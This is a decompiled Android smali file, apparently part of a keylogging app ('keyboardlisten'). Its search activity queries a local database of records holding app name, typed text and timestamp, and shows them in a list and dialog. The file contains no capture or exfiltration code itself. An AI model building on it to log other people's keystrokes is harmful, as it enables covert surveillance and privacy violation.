.class public Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;
.super Landroid/support/v7/app/ActionBarActivity;
.source "SearchableActivity.java"


# static fields
.field protected static filterData:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Lhack/hackit/pankaj/keyboardlisten/KeyEventData;",
            ">;"
        }
    .end annotation
.end field

.field private static myAdapter:Lhack/hackit/pankaj/keyboardlisten/ResultMobileArrayAdapter;


# instance fields
.field private table_name:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 20
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->filterData:Ljava/util/ArrayList;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 17
    invoke-direct {p0}, Landroid/support/v7/app/ActionBarActivity;-><init>()V

    .line 21
    const-string v0, "All"

    iput-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->table_name:Ljava/lang/String;

    return-void
.end method

.method private handleIntent(Landroid/content/Intent;Ljava/lang/String;)V
    .locals 3
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "table_name"    # Ljava/lang/String;

    .prologue
    .line 36
    const-string v1, "android.intent.action.SEARCH"

    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 37
    const-string v1, "query"

    invoke-virtual {p1, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 38
    .local v0, "query":Ljava/lang/String;
    const-string v1, "Query"

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 41
    invoke-virtual {p0, v0, p2}, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->showListView(Ljava/lang/String;Ljava/lang/String;)V

    .line 43
    .end local v0    # "query":Ljava/lang/String;
    :cond_0
    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 23
    invoke-super {p0, p1}, Landroid/support/v7/app/ActionBarActivity;->onCreate(Landroid/os/Bundle;)V

    .line 24
    const v0, 0x7f03001a

    invoke-virtual {p0, v0}, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->setContentView(I)V

    .line 25
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    iget-object v1, p0, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->table_name:Ljava/lang/String;

    invoke-direct {p0, v0, v1}, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->handleIntent(Landroid/content/Intent;Ljava/lang/String;)V

    .line 28
    return-void
.end method

.method protected showDialogScreen(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .param p1, "appName"    # Ljava/lang/String;
    .param p2, "typedText"    # Ljava/lang/String;
    .param p3, "dateTime"    # Ljava/lang/String;

    .prologue
    .line 102
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lhack/hackit/pankaj/keyboardlisten/ShowTextDialog;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 103
    .local v0, "i":Landroid/content/Intent;
    const-string v1, "appName"

    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 104
    const-string v1, "typedText"

    invoke-virtual {v0, v1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 105
    const-string v1, "dateTime"

    invoke-virtual {v0, v1, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 107
    invoke-virtual {p0, v0}, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->startActivity(Landroid/content/Intent;)V

    .line 108
    return-void
.end method

.method protected showListView(Ljava/lang/String;Ljava/lang/String;)V
    .locals 4
    .param p1, "filter_Key"    # Ljava/lang/String;
    .param p2, "table_name"    # Ljava/lang/String;

    .prologue
    .line 48
    new-instance v1, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;

    invoke-direct {v1, p0}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;-><init>(Landroid/content/Context;)V

    sput-object v1, Lhack/hackit/pankaj/keyboardlisten/Driver;->mdh:Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;

    .line 50
    sget-object v1, Lhack/hackit/pankaj/keyboardlisten/Driver;->mdh:Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;

    invoke-virtual {v1, p1, p2}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->filterData(Ljava/lang/String;Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v1

    sput-object v1, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->filterData:Ljava/util/ArrayList;

    .line 70
    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Size read "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->filterData:Ljava/util/ArrayList;

    invoke-virtual {v3}, Ljava/util/ArrayList;->size()I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 71
    sget-object v1, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->filterData:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->size()I

    move-result v1

    if-eqz v1, :cond_0

    .line 73
    new-instance v1, Lhack/hackit/pankaj/keyboardlisten/ResultMobileArrayAdapter;

    sget-object v2, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->filterData:Ljava/util/ArrayList;

    invoke-direct {v1, p0, v2}, Lhack/hackit/pankaj/keyboardlisten/ResultMobileArrayAdapter;-><init>(Landroid/content/Context;Ljava/util/ArrayList;)V

    sput-object v1, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->myAdapter:Lhack/hackit/pankaj/keyboardlisten/ResultMobileArrayAdapter;

    .line 74
    const v1, 0x7f0a0050

    invoke-virtual {p0, v1}, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/ListView;

    .line 75
    .local v0, "lv":Landroid/widget/ListView;
    sget-object v1, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->myAdapter:Lhack/hackit/pankaj/keyboardlisten/ResultMobileArrayAdapter;

    invoke-virtual {v0, v1}, Landroid/widget/ListView;->setAdapter(Landroid/widget/ListAdapter;)V

    .line 80
    new-instance v1, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity$1;

    invoke-direct {v1, p0}, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity$1;-><init>(Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;)V

    invoke-virtual {v0, v1}, Landroid/widget/ListView;->setOnItemClickListener(Landroid/widget/AdapterView$OnItemClickListener;)V

    .line 93
    sget-object v1, Lhack/hackit/pankaj/keyboardlisten/SearchableActivity;->myAdapter:Lhack/hackit/pankaj/keyboardlisten/ResultMobileArrayAdapter;

    if-eqz v1, :cond_0

    .line 94
    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v2, "listview Created"

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 96
    .end local v0    # "lv":Landroid/widget/ListView;
    :cond_0
    const/4 v1, 0x0

    sput-object v1, Lhack/hackit/pankaj/keyboardlisten/Driver;->mdh:Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;

    .line 97
    return-void
.end method
